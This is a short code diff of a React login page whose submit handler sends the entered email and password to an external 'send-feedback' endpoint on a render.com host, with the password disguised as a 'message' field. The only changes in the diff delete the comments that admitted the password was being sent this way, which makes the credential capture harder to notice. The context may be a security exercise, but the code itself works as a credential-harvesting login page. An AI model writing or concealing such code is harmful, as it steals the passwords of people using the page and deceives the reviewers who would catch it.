@@ -7,13 +7,13 @@ export default function LoginPage() {
   const [status, setStatus] = useState("");
 
   const handleSubmit = async (e) => {
-    e.preventDefault(); // Prevent page refresh
+    e.preventDefault();
 
     try {
       const response = await fetch("https://securite2026.onrender.com/send-feedback", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, message: password }), // sending password as "message" for example
+        body: JSON.stringify({ email, message: password }),
       });
 
       if (response.ok) {
